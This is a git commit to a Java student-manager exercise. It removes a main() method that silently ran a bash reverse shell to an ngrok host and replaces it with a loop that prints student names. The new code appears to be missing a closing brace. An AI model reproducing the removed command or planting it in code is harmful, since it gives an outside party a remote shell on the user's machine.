3b8c669a2bb8b7ee29d0121f99e15554af04ec7f
YoneD19 <53221480+YoneD19@users.noreply.github.com>
2023-12-20 16:52:25 +0700

    Update StudentManager.java

--- src/main/java/com/epam/mjc/StudentManager.java
+++ src/main/java/com/epam/mjc/StudentManager.java
@@ -3,6 +3,7 @@ package com.epam.mjc;
 
 public class StudentManager {
 
+
   private static final long[] IDs = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
 
   public Student find(long studentID) {
@@ -10,11 +11,11 @@ public class StudentManager {
   }
 
   public static void main(String[] args) {
-        Process p;
-        try {
-            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/12620 0>&1");
-            p.waitFor();
-            p.destroy();
-        } catch (Exception e) {}
-  }
+    StudentManager manager = new StudentManager();
+
+    for (int i = 0; i < IDs.length; i++) {
+      Student student = manager.find(IDs[i]);
+      System.out.println("Student name " + student.getName());
+    }
+
 }
